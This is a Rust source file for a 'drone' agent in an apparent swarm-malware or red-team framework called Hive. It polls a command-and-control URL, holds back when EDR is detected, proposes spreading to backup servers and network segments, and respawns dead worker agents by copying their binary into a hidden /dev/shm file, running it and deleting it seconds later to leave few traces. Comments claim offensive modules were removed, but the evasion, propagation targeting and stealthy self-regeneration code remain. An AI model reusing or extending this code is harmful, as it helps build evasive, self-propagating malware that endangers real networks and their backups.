use hive_base::{AgentIdentity, ConsensusEngine, HiveChamber, Message, Payload, Role, Value};
use std::collections::HashMap;
use std::env;
use std::fs;
#[cfg(target_os = "linux")]
use std::os::unix::fs::PermissionsExt;
use std::process::Command;
use std::time::{Duration, Instant};
use tokio::time;
use tracing::{info, warn};
use uuid::Uuid;

struct DroneAgent {
    comms: HiveChamber,
    identity: AgentIdentity,
    consensus: ConsensusEngine,
    dead_agents: Vec<Uuid>,
    last_regeneration: Instant,
    regeneration_cooldown: Duration,
    heartbeat_interval: Duration,
    decision_interval: Duration,
}

impl DroneAgent {
    async fn new() -> Self {
        let identity = AgentIdentity::new();
        // TaskPoller (ronda 4): ciclo operador → agente → resultado (HIVE_C2_URL).
        let _ = hive_base::task_poller::spawn_from_env(identity.id(), "drone");
        let comms = HiveChamber::connect(&identity, Role::Drone)
            .await
            .expect("Hive arena");
        let cfg = hive_base::config::HiveConfig::load();

        info!(
            "Hive Drone active | ID: {} | decision_interval: {}s",
            identity.id(),
            cfg.agents.shaper_decision_interval_secs
        );

        // Recover tactical knowledge from stigmergy trails (survives arena restart)
        let knowledge = hive_base::stigmergy::recover_knowledge();
        if !knowledge.is_empty() {
            info!(
                "Drone: recovered {} tactical items from trails",
                knowledge.len()
            );
        }

        Self {
            comms,
            identity,
            consensus: ConsensusEngine::new(0.66),
            dead_agents: vec![],
            last_regeneration: Instant::now()
                .checked_sub(Duration::from_secs(120))
                .unwrap_or(Instant::now()),
            regeneration_cooldown: Duration::from_secs(60),
            heartbeat_interval: Duration::from_secs(cfg.heartbeat.interval_secs),
            decision_interval: Duration::from_secs(cfg.agents.shaper_decision_interval_secs),
        }
    }

    fn select_action(&self, b: &HashMap<String, Value>) -> ShaperAction {
        let edr = b
            .iter()
            .any(|(k, v)| k.contains("edr") && matches!(v, Value::Bool(true)));
        let bu = b
            .iter()
            .any(|(k, v)| k.contains("backup") && matches!(v, Value::Bool(true)));
        if edr {
            ShaperAction::Wait
        } else if bu {
            ShaperAction::PropagateTo("backup_server".into())
        } else {
            ShaperAction::PropagateTo("network_segment".into())
        }
    }

    async fn collect_beliefs(&mut self) -> HashMap<String, Value> {
        let mut b = HashMap::new();
        for msg in self.comms.read_new().await {
            self.consensus.process_message(&msg);
            if msg.is_kill_switch() {
                warn!("Kill switch received - agent self-destructing now");
                std::process::exit(0);
            }
            if let Payload::Belief { asset, value, .. } = &msg.payload {
                b.insert(asset.clone(), value.clone());
            }
            if let Payload::StatusEvent {
                event_type,
                subject_id,
                ..
            } = &msg.payload
            {
                if event_type == "agent_dead" && !self.dead_agents.contains(subject_id) {
                    self.dead_agents.push(*subject_id);
                }
            }
        }
        b
    }

    async fn publish(&self, msg: Message) {
        self.comms.publish(msg).await;
    }

    async fn make_decision(&mut self, beliefs: &HashMap<String, Value>) {
        // Ronda 6: sin módulos ofensivos ni Seer (eliminados). El drone
        // participa en el consenso de la colonia con propuestas operativas.
        match self.select_action(beliefs) {
            ShaperAction::PropagateTo(t) => {
                info!("Drone proposal: prop_to_{}", t);
                let (msg, _) = Message::proposal(
                    self.identity.id(),
                    Role::Drone,
                    format!("prop_to_{}", t),
                    t.clone(),
                );
                self.publish(msg).await;
            }
            ShaperAction::Wait => info!("Drone: waiting (EDR detected)"),
        }
    }

    async fn check_regenerate(&mut self) {
        if self.last_regeneration.elapsed() < self.regeneration_cooldown {
            return;
        }
        self.comms.send_heartbeat().await;
        let active = self.comms.get_active_agents(30).await;
        let workers = active
            .iter()
            .filter(|(_, r, _)| matches!(r, Role::Worker))
            .count();
        if workers < 1 {
            warn!("Drone: no Workers alive, regenerating...");
            self.last_regeneration = Instant::now();
            self.regenerate_agent(Role::Worker).await;

            // Phoenix: in-memory genome snapshot after regeneration (ronda 6:
            // solo modelado en memoria — sin escrituras ni ocultación).
            let blueprint = hive_base::phoenix::AgentBlueprint {
                role: "worker".into(),
                binary_hash: "auto".into(),
                binary_size: 0,
                policy: {
                    let mut p = std::collections::HashMap::new();
                    p.insert("role".into(), "worker".into());
                    p
                },
                encrypted_chunk: Vec::new(),
            };
            let genome = hive_base::phoenix::Phoenix::generate_genome(vec![blueprint]);
            let fragments = hive_base::phoenix::Phoenix::fragment_genome(&genome, 4);
            info!(
                "Phoenix: genome {} fragmentado en {} fragmentos (en memoria)",
                genome.genome_id,
                fragments.len()
            );
        }
    }

    async fn regenerate_agent(&self, role: Role) {
        let name = match role {
            Role::Worker => "worker",
            Role::Weaver => "weaver",
            _ => return,
        };
        let dir = env::current_exe()
            .ok()
            .and_then(|p| p.parent().map(|p| p.to_path_buf()))
            .unwrap_or_else(|| ".".into());
        let arena = env::var("__HIVE_ARENA").unwrap_or_default();
        let mut found = None;
        for candidate in &[dir.join(name), dir.join(format!("target/debug/{}", name))] {
            if candidate.exists() {
                found = Some(candidate.clone());
                break;
            }
        }
        let path = match found {
            Some(p) => p,
            None => {
                warn!("Drone: cannot find {} binary", name);
                return;
            }
        };
        let data = match fs::read(&path) {
            Ok(d) => d,
            Err(_) => {
                warn!("Drone: cannot read {}", name);
                return;
            }
        };
        let shm_path = format!(
            "/dev/shm/.hive_{}_{}",
            name,
            uuid::Uuid::new_v4()
                .to_string()
                .chars()
                .take(8)
                .collect::<String>()
        );
        if fs::write(&shm_path, &data).is_err() {
            warn!("Drone: write failed");
            return;
        }
        #[cfg(target_os = "linux")]
        let _ = fs::set_permissions(&shm_path, std::fs::Permissions::from_mode(0o700));
        match Command::new(&shm_path).env("__HIVE_ARENA", &arena).spawn() {
            Ok(child) => {
                let pid = child.id();
                info!(
                    "Drone: regenerated {} (PID: {}, path: {})",
                    name, pid, shm_path
                );
                tokio::spawn(async move {
                    tokio::time::sleep(Duration::from_secs(5)).await;
                    let _ = fs::remove_file(&shm_path);
                });
            }
            Err(e) => warn!("Drone: spawn failed: {}", e),
        }
    }

    async fn run(&mut self) {
        let mut hb = time::interval(self.heartbeat_interval);
        let mut dec = time::interval(self.decision_interval);
        loop {
            tokio::select! {
                _ = hb.tick() => { self.comms.send_heartbeat().await; self.check_regenerate().await; }
                _ = dec.tick() => { let b = self.collect_beliefs().await; info!("Drone decision tick: {} beliefs", b.len()); if !b.is_empty() { self.make_decision(&b).await; } }
                _ = time::sleep(Duration::from_millis(200)) => {}
            }
        }
    }
}

enum ShaperAction {
    PropagateTo(String),
    Wait,
}

#[tokio::main]
async fn main() {
    hive_base::utils::init_logging("drone");
    info!("Hive Drone initializing...");
    DroneAgent::new().await.run().await;
}
